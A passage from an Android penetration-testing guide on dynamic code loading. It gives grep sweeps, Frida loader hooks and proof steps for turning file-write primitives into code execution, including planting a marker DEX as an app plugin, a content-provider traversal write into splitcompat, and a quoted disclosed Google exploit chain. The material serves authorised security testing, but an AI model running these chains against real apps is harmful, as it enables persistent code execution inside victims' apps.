# D17 · Dynamic Code Loading, Deserialization & Supply Chain

> This is the domain where every other domain's file-write, traversal and redirection primitive cashes out
> as arbitrary code execution inside the victim app's UID. Its honest ceiling is **P1
> `server_side_injection.remote_code_execution_rce`** — but only when you show *your* bytes executing under
> *their* package name; the version-string report that most testers file instead is
> `using_components_with_known_vulnerabilities.outdated_software_version`, **P5**, and the unsigned-update
> report is `insecure_data_transport.executable_download.no_secure_integrity_check`, **P4**. The whole craft
> of this chapter is the distance between those three ratings.

| | |
|---|---|
| **Phases** | P3 inventory (is there a code-load channel at all), **P4 static** (loader call sites, deserialization sinks, dependency graph), **P5 dynamic** (substitute the artefact, drive the IPC sink, MitM the update channel) |
| **Milestones** | **M4** (static review complete, every load site and deserialization sink triaged), **M5** (chain proven end-to-end: write primitive → load path → execution under the victim UID) |
| **VRT ceiling** | **P1 — `server_side_injection.remote_code_execution_rce`**, defensible whenever you demonstrate attacker code running in the target process. The closest Android-native node, `client_side_injection.binary_planting.privilege_escalation` (**P3**, CWE-929), understates it; its sibling `client_side_injection.binary_planting.non_default_folder_privilege_escalation` is **P5**, so always demonstrate the *default* load path. `insecure_data_transport.executable_download.no_secure_integrity_check` (**P4**, CWE-353/354/494) is the OTA baseline you must override with an execution proof. `using_components_with_known_vulnerabilities.outdated_software_version` (**P5**) is what a version-only dependency report gets, every time. |
| **Primary attacker model** | **AM-03** zero-permission local app (the file-write → code-load chain, `createPackageContext`, IPC deserialization). **AM-09** malicious backend/CDN and **AM-06** network attacker for the OTA half. **AM-08** malicious third-party SDK for the remote-activation items. **AM-12 is not an attack** — overwriting your own app's DEX on your own rooted device proves nothing. |
| **Maps to** | MASVS-CODE-2, MASVS-CODE-3, MASVS-CODE-4 · MASWE-0049 (Unsafe Dynamic Code Loading), MASWE-0050 (Unsafe Handling of Untrusted Data), MASWE-0044 (Dependencies with Known Vulnerabilities), MASWE-0048 (Malicious Code Included in the App), MASWE-0011 (Improper Verification of Cryptographic Signature), MASWE-0043 (Enforced Updating Not Implemented), MASWE-0075 (Non-Reproducible Builds) · MASTG-TEST-0337, MASTG-TEST-0272, MASTG-TEST-0274, MASTG-TEST-0382, MASTG-TEST-0392, MASTG-TEST-0034 (deprecated) · MASTG-TECH-0012, MASTG-TECH-0029, MASTG-TECH-0041 (Library Injection), MASTG-TECH-0042, MASTG-TECH-0129, MASTG-TECH-0130, MASTG-TECH-0131, MASTG-TECH-0165 · MASTG-TOOL-0009 (apkid), MASTG-TOOL-0022, MASTG-TOOL-0130 (blint), MASTG-TOOL-0131 (dependency-check), MASTG-TOOL-0132 (dependency-track), MASTG-TOOL-0134 (cdxgen) · MASTG-KNOW-0004, MASTG-KNOW-0021, MASTG-KNOW-0025, MASTG-KNOW-0042 · CWE-494, CWE-502, CWE-501, CWE-506, CWE-507, CWE-511, CWE-829, CWE-929, CWE-1395, CWE-353, CWE-354, CWE-73, CWE-602, CWE-693 · T1407 (Download New Code at Runtime), T1544 (Ingress Tool Transfer), T1661 (Application Versioning), T1474 / T1474.001 / T1474.003, T1626, T1406.002 |

## Why this domain pays

It pays because it is the only Android domain whose finished product is *arbitrary code execution with the
victim's UID, permissions, Keystore handles and network session* — and because the platform itself
acknowledges the bug class. Android 14's `setReadOnly()`-before-write mandate for dynamically loaded
DEX/JAR/APK files, and Android 14's default `ZipException` on `..` entries, are both the platform conceding
that apps were routinely loading code from paths another party could rewrite. Oversecured measured the
`createPackageContext` variant alone at roughly **one in every fifty popular apps**. CVE-2020-8913 (Play
Core `< 1.7.2`) was estimated at ~13% of Play apps affected and ~8% still vulnerable at disclosure, and the
Google-app chain built on it — intent redirection → provider path-traversal write into
`splitcompat/<ver>/verified-splits/config.*` → SplitCompat load — ran `chmod -R 777` inside the Google app's
own data directory, persisted after the attacker app was removed, and needed **no user consent**. That is
the shape to hunt.

It also pays because of an asymmetry nobody exploits: everybody greps for `DexClassLoader`, almost nobody
maps the app's *write* primitives onto the loader's *read* path. D07 and D08 testers find a provider
traversal and file it as "arbitrary file write, High". D17 testers take the same primitive, land it in
`lib-main/`, `verified-splits/config.x.apk`, `files/plugin.dex` or a `.so` the app `System.load()`s, and
file P1. The write and the load are separate fixes — file them as separate reports and let the chain be the
severity amplifier (see D17-075).

Be honest about the rest of it. Most of this domain is graveyard, and the graveyard is enormous. "App
bundles okhttp 4.9.0, CVE-2021-0341" with no pinning and system trust is **Low**, and with no reachability
trace it is P5 `using_components_with_known_vulnerabilities.outdated_software_version`. "App calls
`getSerializableExtra`" behind a non-exported component is not attacker-fed and is not a finding at all.
"No `gradle/verification-metadata.xml`" is a Medium process observation in a pentest and out of scope on
most bounty programmes. A `play:core` reference that resolves to **`feature-delivery 2.1.0`** — the patched
2.x rewrite — means CVE-2020-8913 is **not applicable**, and the worked negative belongs in the ruled-out
register, not the findings list. The single most valuable habit in this chapter is closing your own false
positives before the triager does.

## The crux question

**Does any byte this app executes arrive after the APK was signed — and if so, what cryptographic check
stands between the attacker-influenceable source of those bytes and the `ClassLoader`/`dlopen`/JS-engine
call that runs them?**

## Triage order

1. **Hook every loader at runtime for one full app walkthrough** (`DexClassLoader.$init`,
   `InMemoryDexClassLoader.$init`, `System.load`, `System.loadLibrary`, `Runtime.load`,
   `ClassLoader.loadClass`, and for RN `CatalystInstanceImpl.loadScriptFromFile`). Twenty minutes, and it
   answers the crux question empirically instead of by grep — including for packed apps where the static
   view is a stub.
2. **Establish which artefact is actually executing.** If OTA is live, the APK's bundle is only the
   fallback, and every static finding you are about to write is stated against the wrong bytes. This gates
   the entire engagement, not just this chapter.
3. **Manifest and `strings.xml` for the OTA signing config** — `expo.modules.updates.CODE_SIGNING_*`,
   `CodePushPublicKey`, `CodePushDeploymentKey`. Four greps, and a missing key is an RCE-class finding on
   an app you have not yet decompiled.
4. **`createPackageContext` + `CONTEXT_INCLUDE_CODE` + `CONTEXT_IGNORE_SECURITY` + prefix matching.** One
   grep, Critical when it hits, and the PoC is a package-name claim rather than an exploit.
5. **Cross-reference every file-write primitive from D07/D08/D11 against every load path found in step 1.**
   This is the join that produces the chapter's P1s; run it as an explicit table, not from memory.
6. **Deserialization sinks reachable from an *exported* component**, verified export status first. Behind a
   non-exported component this is not attacker-fed and costs you credibility to file.
7. **Archive-extraction loops** (`ZipEntry.getName()` into `new File(dir, name)`), because zip slip is the
   cheapest delivery vehicle for step 5 and is testable with a six-line Python script.
8. **Dependency graph and SBOM last**, and only with a reachability trace attached. This step produces the
   most output and the fewest payable findings; do it when the high-yield work is done.

## Items

### D17-001 · Inventory every code-load call site in the shipped artefact

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — inventory step that feeds `server_side_injection.remote_code_execution_rce` (P1) |
| **Attacker** | n/a (tester step) |
| **Applies to** | all |
| **Maps to** | MASWE-0049; MASTG-TECH-0029; `developer.android.com/privacy-and-security/risks/dynamic-code-loading` (MASVS-CODE) |

- **Test:** Enumerate every API that can turn bytes into executable code in this process, then trace each
  one's path argument back to its origin. Everything else in this chapter is a consequence of this table.
- **How:**
  ```bash
  jadx -d out target.apk
  # Java/Kotlin loaders
  grep -rnE 'DexClassLoader|PathClassLoader|InMemoryDexClassLoader|BaseDexClassLoader|DelegateLastClassLoader|DexFile|openDexFile|URLClassLoader|optimizedDirectory' out/sources/ \
    | grep -viE '^out/sources/(android|androidx|dalvik|kotlin)/'
  # native loaders
  grep -rnE 'System\.load\(|System\.loadLibrary\(|Runtime\.getRuntime\(\)\.load' out/sources/ \
    | grep -viE '^out/sources/(android|androidx)/'
  # cross-package code
  grep -rnE 'createPackageContext|CONTEXT_INCLUDE_CODE|CONTEXT_IGNORE_SECURITY|getClassLoader\(\)' out/sources/
  # split / feature modules
  grep -rnE 'SplitCompat|SplitInstallManager|SplitCompatApplication|com\.google\.android\.play\.core' out/sources/
  # reflection dispatchers
  grep -rncE 'Class\.forName\(|getDeclaredMethod\(|getMethod\(|\.invoke\(' out/sources/ | sort -t: -k2 -rn | head -20
  # what directories does the app hand to a loader?
  grep -rnE 'getDir\("|getFilesDir\(\)|getCodeCacheDir\(\)|getCacheDir\(\)|getExternalFilesDir|getExternalCacheDir|nativeLibraryDir' out/sources/
  ```
  Build one table: `call site | artefact path | who can write that path | is there a signature/hash check
  between the read and the load`.
- **Proof:** The completed table. An empty table is itself a deliverable — it is the evidence behind
  "F-00x's write primitive cannot reach code execution because this app performs no dynamic code loading".
- **Escalation:** Feeds D17-008 through D17-021 (writable-path execution) and the D07/D08 write-primitive
  join.
- **Ruled out when:** The static sweep is empty **and** the runtime hook of D17-002 fires only for
  `PathClassLoader` over `/data/app/~~*/base.apk` (the platform's own loader for the installed APK) across a
  full feature walkthrough, **and** APKiD reports no packer (D17-005). All three, or you have a
  false negative.

### D17-002 · Runtime code-load trace before you believe any static conclusion

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a |
| **Attacker** | n/a (tester step) |
| **Applies to** | all; mandatory for packed, obfuscated or cross-platform apps |
| **Maps to** | MASTG-TECH-0042 (Getting Loaded Classes and Methods Dynamically); MASTG-TECH-0041 (Library Injection); Frida `DexClassLoader`/`InMemoryDexClassLoader` hooks |

- **Test:** Grep sees only what R8 left behind and nothing a packer decrypts. Hook the loaders and drive the
  app through every feature — onboarding, login, payment, settings, the update check, and a cold start after
  an update.
- **How:**
  ```javascript
  // loaders.js  —  frida -U -f com.target.app -l loaders.js --no-pause
  Java.perform(function () {
    var DCL = Java.use('dalvik.system.DexClassLoader');
    DCL.$init.implementation = function (dex, opt, lib, parent) {
      console.log('[DexClassLoader] dex=' + dex + ' opt=' + opt + ' lib=' + lib);
      return this.$init(dex, opt, lib, parent);
    };
    var PCL = Java.use('dalvik.system.PathClassLoader');
    PCL.$init.overloads.forEach(function (o) {
      o.implementation = function () {
        console.log('[PathClassLoader] ' + Array.prototype.slice.call(arguments).join(' | '));
        return o.apply(this, arguments);
      };
    });
    var IMDCL = Java.use('dalvik.system.InMemoryDexClassLoader');
    IMDCL.$init.overloads.forEach(function (o) {
      o.implementation = function () {
        var a = arguments[0];
        console.log('[InMemoryDexClassLoader] capacity=' + (a && a.capacity ? a.capacity() : '?'));
        return o.apply(this, arguments);
      };
    });
    var S = Java.use('java.lang.System');
    S.load.overload('java.lang.String').implementation = function (p) {
      console.log('[System.load] ' + p); return this.load(p); };
    S.loadLibrary.overload('java.lang.String').implementation = function (n) {
      console.log('[System.loadLibrary] ' + n); return this.loadLibrary(n); };
    var R = Java.use('java.lang.Runtime');
    R.load.overload('java.lang.String').implementation = function (p) {
      console.log('[Runtime.load] ' + p); return this.load(p); };
  });
  ```
  ```bash
  # native side, catches dlopen the Java hooks miss
  frida-trace -U -f com.target.app -i "dlopen*" -i "android_dlopen_ext"
  # and the ground truth after the fact
  adb shell run-as com.target.app sh -c 'find files cache code_cache no_backup app_* -maxdepth 5 \
    \( -name "*.dex" -o -name "*.jar" -o -name "*.apk" -o -name "*.so" -o -name "*.bundle" -o -name "*.hbc" \) -ls 2>/dev/null'
  adb shell "cat /proc/$(adb shell pidof com.target.app)/maps" | grep -E '\.(so|dex|jar|apk|oat|vdex)$' | grep -v '/data/app/'
  ```
- **Proof:** A logged load whose path is **not** under `/data/app/` — e.g.
  `[DexClassLoader] dex=/data/user/0/com.target.app/files/plugin.dex`, or a `/proc/<pid>/maps` line for a
  `.so` under `files/`.
- **Escalation:** Each non-APK path becomes a row in the D17-001 table and a candidate for D17-008.
- **Ruled out when:** Across a complete feature walkthrough including an update check, every load resolves
  under `/data/app/~~<random>/com.target.app-<random>/` or `/apex/`, and `/proc/<pid>/maps` shows no mapped
  `.so` outside the APK and the system paths.

### D17-003 · Enumerate class loaders — the classes `Java.use` cannot see

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a |
| **Attacker** | n/a (tester step) |
| **Applies to** | apps using `DexClassLoader`, `InMemoryDexClassLoader`, Play Feature Delivery, or any OTA/plugin framework |
| **Maps to** | Frida `Java.enumerateClassLoaders`, `Java.ClassFactory.get(classLoader)`, `Java.classFactory`, `Java.openClassFile(filePath)`; objection `android hooking list class_loaders`; MASTG-TECH-0042 |

- **Test:** Code loaded from a secondary DEX, a downloaded plugin or a dynamic feature module lives in a
  *different* `ClassLoader`. `Java.use` uses the app's main loader and throws `ClassNotFoundException` for
  those classes — routinely misread as "the class does not exist", which produces a false negative on the
  single most important class in the app.
- **How:**
  ```javascript
  Java.perform(function () {
    Java.enumerateClassLoaders({
      onMatch: function (loader) {
        console.log('[loader] ' + loader.toString());
        try {
          var f = Java.ClassFactory.get(loader);
          var C = f.use('com.target.plugin.SecretHandler');   // swap for your target class
          console.log('  -> resolvable on this loader');
          C.process.implementation = function (x) { console.log('[process] ' + x); return this.process(x); };
        } catch (e) {}
      },
      onComplete: function () {}
    });
  });
  ```
  ```bash
  objection -g com.target.app explore -s "android hooking list class_loaders"
  ```
- **Proof:** A `DexClassLoader`/`InMemoryDexClassLoader`/`PathClassLoader` entry whose `toString()` names a
  path outside the base APK, plus a successful hook on a class reachable only through it.
- **Escalation:** Identifies the artefact to substitute in D17-008; identifies the verification routine to
  neutralise in D17-034.
- **Ruled out when:** `Java.enumerateClassLoaders` returns only the boot classloader and a single
  `PathClassLoader` over `/data/app/…/base.apk` (plus split APKs from the same install session) at every
  point in the app's lifecycle you sampled.

### D17-004 · In-memory DEX loading that leaves no file artefact

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) when the upstream input is attacker-influenceable |
| **Attacker** | AM-03 / AM-06 / AM-09 depending on where the blob comes from |
| **Applies to** | all; modern updaters and packers specifically. Note `InMemoryDexClassLoader` sidesteps the Android 14 file-path DCL hardening entirely because no writable DEX path ever exists |
| **Maps to** | MASWE-0049; HackTricks *insecure-in-app-update-rce* ("In-memory DEX loaders"); ATT&CK T1406.002 (the `assets/*.dat` → AES/CBC hardcoded key+IV → `DexClassLoader` dropper pattern) |

- **Test:** An updater that decrypts into a `ByteBuffer` and calls `InMemoryDexClassLoader` produces no
  `.dex` on disk, so a filesystem-only sweep concludes "no dynamic code loading". Hook the constructor, then
  pivot **backwards** into the routine that produced the buffer and attack *that* input.
- **How:**
  ```javascript
  Java.perform(function () {
    var IMDCL = Java.use('dalvik.system.InMemoryDexClassLoader');
    IMDCL.$init.overloads.forEach(function (o) {
      o.implementation = function () {
        var b = arguments[0];
        console.log('[InMemoryDexClassLoader] capacity=' + (b && b.capacity ? b.capacity() : '?'));
        console.log(Java.use('android.util.Log').getStackTraceString(Java.use('java.lang.Exception').$new()));
        return o.apply(this, arguments);
      };
    });
  });
  ```
  The stack trace names the decrypt/decompress routine. Read it and answer: what is the *input* — a
  downloaded archive, an encrypted blob in `assets/`, a metadata field from the update response? Then attack
  the input, not the loader.
- **Proof:** The hook firing with a non-trivial capacity, plus a decompiled upstream routine whose input is
  a tamperable archive, a network-sourced blob, or an attacker-controlled metadata field. Dump the recovered
  DEX from the buffer for static analysis.
- **Escalation:** → D17-033 (forge the update metadata), D17-056 (zip slip into the staging archive), D12
  if the decryption key is hardcoded.
- **Ruled out when:** The hook never fires across a full walkthrough including a forced update check; or it
  fires only for a buffer built from bytes read out of the signed APK's own `assets/` with no network or IPC
  input anywhere in the producing call chain.

### D17-005 · Packer / obfuscator detection before you conclude "no dynamic loading"

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — obfuscation alone is informational and must never be filed |
| **Attacker** | n/a (tester step) |
| **Applies to** | all |
| **Maps to** | MASTG-TOOL-0009 (APKiD); MASTG-TOOL-0022 (ProGuard — note it strips the version info this chapter needs) |

- **Test:** If `jadx` output is empty, trivial, or an obvious stub, the real DEX is decrypted at runtime and
  every grep in this chapter returns nothing for the wrong reason. Detect it explicitly rather than
  reporting a clean result.
- **How:**
  ```bash
  apkid target.apk
  jadx -d out target.apk 2>&1 | tail -5
  # class-count sanity check: static vs runtime
  grep -rc 'class ' out/sources/ | wc -l
  ```
  ```javascript
  // runtime class count — if it dwarfs the static one, the app unpacks itself
  Java.perform(function () {
    var n = 0;
    Java.enumerateLoadedClasses({ onMatch: function () { n++; }, onComplete: function () { console.log('loaded classes: ' + n); } });
  });
  ```
- **Proof:** APKiD naming a packer/obfuscator, plus a runtime-dumped DEX containing substantially more
  classes than the static output.
- **Escalation:** Unblocks every static item in this chapter and in D03/D04/D10. The packer itself is not
  the finding; what it hides is.
- **Ruled out when:** APKiD reports only a compiler (`dexlib`, `dx`, `r8`) and no packer, and the static
  class count is within an order of magnitude of the runtime count.

### D17-006 · Executing-artefact identity — are you analysing the code that actually runs?

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `insecure_data_transport.executable_download.no_secure_integrity_check` (P4) as the reportable half; the methodological half is not a finding |
| **Attacker** | n/a for the method; AM-09 for the consequence |
| **Applies to** | React Native / Expo / CodePush / Cordova / any app with a custom DEX or JS updater |
| **Maps to** | facebook/hermes `BytecodeFileHeader.sourceHash`; `CodePushConstants.DEFAULT_JS_BUNDLE_NAME`; expo `dev.expo.updates.prefs` / `updates.db`; MASWE-0075 (Non-Reproducible Builds) |

- **Test:** If OTA is enabled, the bundle inside the APK is only the *fallback*. Every static finding, and
  every "we fixed that" claim from the client, must be re-verified against the bundle currently in use. This
  also means a security control the client believes is shipped can be silently removed post-review by a
  channel push, with no `versionCode` change.
- **How:**
  ```bash
  # 1. hash the bundle inside the APK
  unzip -o target.apk 'assets/*' -d ext
  python3 - <<'PY'
  import struct
  d = open('ext/assets/index.android.bundle','rb').read(64)
  print('apk  sourceHash', d[12:32].hex(), 'bytecodeVersion', struct.unpack_from('<I', d, 8)[0])
  PY
  # 2. pull the live bundle off the device and hash it the same way
  adb shell "run-as com.target.app find files -name 'index.android.bundle' -o -name '*.hbc' -o -name '*.bundle'"
  adb exec-out run-as com.target.app cat files/CodePush/<hash>/<app>/index.android.bundle > live.bundle
  python3 - <<'PY'
  import struct
  d = open('live.bundle','rb').read(64)
  print('live sourceHash', d[12:32].hex(), 'bytecodeVersion', struct.unpack_from('<I', d, 8)[0])
  PY
  # 3. or capture it at load time regardless of location
  frida -U -f com.target.app -q -e "
  Java.perform(function(){
    var C = Java.use('com.facebook.react.bridge.CatalystInstanceImpl');
    C.loadScriptFromFile.implementation=function(f,u,z){console.log('[bundle-from-file] '+f);return this.loadScriptFromFile(f,u,z);};
    C.loadScriptFromAssets.implementation=function(a,u,z){console.log('[bundle-from-assets] '+u);return this.loadScriptFromAssets(a,u,z);};
  });"
  # 4. expo-side artefacts
  adb shell "run-as com.target.app ls -la files/.expo-internal/ shared_prefs/dev.expo.updates.prefs.xml" 2>/dev/null
  ```
  Cross-check the app's self-reported version (User-Agent, analytics payload) against the installed
  `versionName` — an observed mismatch such as APK `5.67.0` vs executing bundle `5.67.1` is decisive.
- **Proof:** Two different Hermes `sourceHash` values, or a
  `[bundle-from-file] /data/user/0/com.target.app/files/CodePush/…` log line proving the executing code did
  not come from the APK.
- **Escalation:** Re-base the whole engagement on the on-device bundle and say so in the report's scope
  section. → D17-028/029 for the signature question; → D19 for bundle analysis.
- **Ruled out when:** The manifest carries no `expo.modules.updates.*` meta-data, `strings.xml` carries no
  `CodePush*` resource, the `CatalystInstanceImpl` hook fires only `loadScriptFromAssets`, and the on-device
  `files/` contains no bundle. Record the APK's own `sourceHash` as the tested artefact either way.

### D17-007 · The app ships an ingress capability — it downloads and stores executables

| | |
|---|---|
| **Severity ceiling** | High (Critical once the fetch is shown unsigned/unpinned — then it is D17-027) |
| **VRT** | `insecure_data_transport.executable_download.no_secure_integrity_check` (P4) → override with the execution proof |
| **Attacker** | AM-06 / AM-09 |
| **Applies to** | all |
| **Maps to** | ATT&CK T1544 (Ingress Tool Transfer — detection framing: "correlating outbound retrieval to non-baselined sources with immediate local executable creation"); T1407 |

- **Test:** Does the app download binaries, scripts or archives to the device? Each download is
  simultaneously a substitution candidate and a dropper wearing the client's brand.
- **How:**
  ```bash
  grep -rnE 'DownloadManager|\.byteStream\(|FileOutputStream|ZipInputStream|setExecutable|chmod|"\.apk"|"\.so"|"\.dex"|"\.jar"' -B4 -A4 out/sources/ \
    | grep -viE '^out/sources/(android|androidx)/'
  # what actually lands, and when
  adb shell "run-as com.target.app find . -type f \( -name '*.so' -o -name '*.dex' -o -name '*.jar' -o -name '*.apk' -o -name '*.zip' \) -newermt '-1 hour' -ls"
  adb shell dumpsys package com.target.app | grep -i 'REQUEST_INSTALL_PACKAGES'
  ```
- **Proof:** A file in the app's data dir after a feature is used that was not in the APK — list it with its
  timestamp and SHA-256, and show the source URL in the proxy log.
- **Escalation:** `setExecutable(true)` on a downloaded file plus any exec primitive is RCE.
  `REQUEST_INSTALL_PACKAGES` plus an unsigned download is a second-stage APK install (state the privilege
  precisely — see D17-037).
- **Ruled out when:** No file appears in the app's data directory that is not derived from the APK or from
  user-supplied content, across a complete feature walkthrough with the proxy recording every response
  `Content-Type`.

### D17-008 · DexClassLoader / PathClassLoader over an attacker-writable path

| | |
|---|---|
| **Severity ceiling** | **Critical** |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1); the Android-native analogue `client_side_injection.binary_planting.privilege_escalation` (P3, CWE-929) understates it — cite it for accuracy and request P1 with the execution proof |
| **Attacker** | AM-03 (local app writing the path) / AM-09 (the path was populated from the network) |
| **Applies to** | all. `optimizedDirectory` is deprecated from **API 26** but an old call site pointing it at a shared directory is still live on lower `minSdk` |
| **Maps to** | MASWE-0049 (CWE-494); `risks/dynamic-code-loading` (MASVS-CODE); `about/versions/14/behavior-changes-14`; H1 #1161956 (porcupiney.hairs, "Insecure Loading of a Dex File"); H1 #1115864 (persistent arbitrary code execution in Mattermost Android) |

- **Test:** A `ClassLoader` constructed over a file the app (or anyone else) can rewrite, with no
  **load-time** signature check, turns any file-write primitive into persistent code execution. Google's
  rule is absolute: *"Don't load code from external sources (network, external storage)."*
- **How:**
  ```bash
  grep -rnE 'DexClassLoader|PathClassLoader|InMemoryDexClassLoader|BaseDexClassLoader|DelegateLastClassLoader' -B8 -A8 out/sources/ \
    | grep -nE 'getExternalFilesDir|getExternalCacheDir|getCacheDir|getFilesDir|getDir\(|download|http|optimizedDirectory'
  grep -rn 'setReadOnly()' out/sources/          # its ABSENCE next to a loader is the tell
  adb shell run-as com.target.app ls -l files/ cache/ code_cache/ app_dex/ no_backup/ 2>/dev/null
  adb shell ls -la /sdcard/Android/data/com.target.app/files/ 2>/dev/null
  ```
  Substitute and prove execution:
  ```bash
  cat > Payload.java <<'EOF'
  package com.pwn;
  public class Payload {
    static { android.util.Log.i("PWNMARK7f3a91",
      "uid=" + android.os.Process.myUid() + " pkg=" + System.getProperty("java.class.path")); }
  }
  EOF
  javac -source 8 -target 8 -cp "$ANDROID_HOME/platforms/android-34/android.jar" Payload.java -d cls
  d8 --output . cls/com/pwn/Payload.class
  adb push classes.dex /sdcard/
  adb shell "run-as com.target.app cp /sdcard/classes.dex files/plugin.dex"
  adb shell am force-stop com.target.app && adb shell monkey -p com.target.app 1
  adb logcat --pid=$(adb shell pidof com.target.app) | grep PWNMARK7f3a91
  ```
- **Proof:** `adb logcat --pid=<victim pid>` showing your marker, with `Process.myUid()` printing the
  **victim's** UID. Pair it with `ls -l` proving the artefact was writable at load time.
- **Escalation:** Everything in the victim's sandbox — D11 storage, D12 Keystore handles, D13 session
  tokens; on a `sharedUserId` app, the sibling set too. Persistence survives restarts.
- **Ruled out when:** Every loader path resolves under `/data/app/` or under an app-private directory the
  app itself creates mode `0700` **and** the artefact is `setReadOnly()` before content is written **and**
  no write primitive from D07/D08/D11 reaches that directory. All three conditions, documented individually.

### D17-009 · Map every file-write primitive to a code-load path — the chain rule

| | |
|---|---|
| **Severity ceiling** | **Critical** |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
| **Attacker** | AM-03 |
| **Applies to** | all — run this whenever *any* domain produces a write, create, copy, rename or extract primitive |
| **Maps to** | Oversecured *"Why dynamic code loading could be dangerous for your apps: a Google example"*; Intigriti Bug Bytes #128 and #87; Microsoft *Dirty Stream* (Xiaomi File Manager V1-210567 → V1-210593; WPS Office 16.8.1 → 17.0.0) |

- **Test:** A write is not execution. The moment you obtain any write primitive, the next question is not
  "what can I overwrite" but "which of this app's own load paths reads that directory". The corpus's
  highest-severity Android chain is exactly this join, and the write and the load are usually owned by
  different teams, which is why neither side finds it.
- **How:** Build the join explicitly:
  ```bash
  # LOAD side (from D17-001/002)
  grep -rnE 'DexClassLoader|PathClassLoader|System\.load\(|SplitCompat|splitcompat' out/sources/ > /tmp/load_sites.txt
  # WRITE side (from D07 traversal, D08 redirection, D11 external storage, D17-056 zip slip)
  #   e.g. a provider whose openFile() resolves a caller-supplied name:
  adb shell content write --uri \
    'content://com.target.provider/..%2Fsplitcompat%2F12345%2Fverified-splits%2Fconfig.pwn.apk' < payload.apk
  # confirm the landing
  adb shell run-as com.target.app ls -laR files/splitcompat/ files/ lib-main/ 2>/dev/null
  ```
  The canonical disclosed shape, for reference when writing the report:
  ```java
  Uri uri = Uri.parse("content://com.google.android.googlequicksearchbox.CommonContentProvider/"
    + "assist.com.google.android.apps.gsa.staticplugins.assist.screenshot.ScreenshotProvider/1/"
    + "ScreenAssistScreenshots/..%2Fsplitcompat%2F" + getVersionCode() + "%2Fverified-splits%2Fconfig.test.apk");
  getContentResolver().openOutputStream(uri);   // attacker copies its own sourceDir APK here
  ```
- **Proof:** The written file present at the traversed path (`run-as … ls -l`), followed by a class from it
  resolving in the victim's `ClassLoader` — hook `ClassLoader.loadClass` or emit a marker from a static
  initialiser and capture it under the victim's PID.
- **Escalation:** Terminal. Call out persistence explicitly: in the disclosed Google case the attacker app
  needed to launch **once** and the execution survived its own uninstall, which materially raises severity.
- **Ruled out when:** The load-site table from D17-001 is empty, or every entry's directory is unreachable
  by every write primitive you enumerated — state which write primitives you tested against which
  directories, one line each. "I didn't find a write primitive" is not this field; "the only write primitive
  lands in `cache/images/` and no loader reads it" is.

### D17-010 · Dynamically loaded file not marked read-only before write (Android 14 race)

| | |
|---|---|
| **Severity ceiling** | Critical (when another writer can reach the path) / High as a missing-mitigation finding |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) with the race won; otherwise `client_side_injection.binary_planting.privilege_escalation` (P3) |
| **Attacker** | AM-03 |
| **Applies to** | Platform **enforcement at targetSdk ≥ 34**; the underlying race exists at every API level |
| **Maps to** | `about/versions/14/behavior-changes-14` — "Safer Dynamic Code Loading (DCL): all dynamically-loaded files must be marked as read-only … Set files read-only **before** writing content to prevent race conditions"; "For Existing Files: Delete and recreate, or verify integrity before relabeling as read-only"; AOSP Android 14 "Dynamic Code Loading restrictions" |

- **Test:** The documented pattern is `setReadOnly()` **then** write. An app that writes first and marks
  read-only afterwards (or never) leaves a window in which another writer substitutes content between the
  write and the load. Android 14's mandate is the platform conceding the class exists — and apps that had to
  comply sometimes moved the payload out of the checked path instead (native `dlopen`, or write-then-copy).
- **How:**
  ```bash
  grep -rnE 'DexClassLoader|PathClassLoader|InMemoryDexClassLoader|BaseDexClassLoader' -B6 -A10 out/sources/ \
    | grep -nE 'setReadOnly|FileOutputStream|\.write\(|Files\.copy'
  adb shell run-as com.target.app ls -l files/*.jar files/*.dex app_dex/ code_cache/ 2>/dev/null
  adb logcat -d | grep -iE 'dex file .* is not read-only|Writable dex file|not read-only'
  ```
  The compliant shape, for the remediation text:
  ```java
  File jar = new File("DYNAMICALLY_LOADED_FILE.jar");
  try (FileOutputStream os = new FileOutputStream(jar)) {
      jar.setReadOnly();      // FIRST
      // then write content
  }
  PathClassLoader cl = new PathClassLoader(jar.getPath(), parentClassLoader);
  ```
- **Proof:** `ls -l` showing a loaded `.jar`/`.dex` at mode `-rw-------` or wider, or the platform's own
  refusal in logcat on a 34+ target. With another writer available, win the race and show your code
  executing under the victim's PID.
- **Escalation:** → D17-008. If the app moved the payload to a native `dlopen` path to dodge the mandate,
  → D17-013.
- **Ruled out when:** Every dynamically loaded file is created, `setReadOnly()` is called before the first
  write, and `ls -l` confirms mode `-r--------`; or the app targets 34+ and no `DexClassLoader`-family call
  exists at all.

### D17-011 · External-storage staging of executable content (man-in-the-disk)

| | |
|---|---|
| **Severity ceiling** | **Critical** |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1); the storage half alone is `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_external_storage` (P4) — do not file it there |
| **Attacker** | AM-03 (pre-scoped-storage) / AM-04 with `READ/WRITE_EXTERNAL_STORAGE` |
| **Applies to** | `targetSdk < 29`, or `targetSdk ≥ 29` with `android:requestLegacyExternalStorage="true"`. On scoped storage the world-writable variant narrows to the app's own `Android/data/<pkg>/` tree, which is still reachable by anything holding `MANAGE_EXTERNAL_STORAGE` or by the user |
| **Maps to** | MASTG-KNOW-0042 ("external storage can lead to arbitrary control of the application"); HackTricks *insecure-in-app-update-rce* ("External storage staging"); **CVE-2021-24027** (WhatsApp) as the named man-in-the-disk precedent |

- **Test:** If an archive, plugin or library is written to external storage before being loaded, another app
  can tamper with it between download and load — no network position required.
- **How:**
  ```bash
  grep -n 'requestLegacyExternalStorage\|MANAGE_EXTERNAL_STORAGE' out/AndroidManifest.xml
  grep -rnE 'getExternalFilesDir|getExternalCacheDir|Environment\.getExternalStorage' out/sources/ -A6 \
    | grep -iE 'dex|jar|apk|so|zip|bundle|plugin|update'
  adb shell ls -lR /sdcard/Android/data/com.target.app/ | grep -Ei '\.(so|dex|jar|apk|zip|bundle)$'
  ```
  Then race it from a second unprivileged app, or simply overwrite between the download and the launch:
  ```bash
  adb shell am force-stop com.target.app
  adb push evil.dex /sdcard/Android/data/com.target.app/files/plugin.dex
  adb shell monkey -p com.target.app 1
  ```
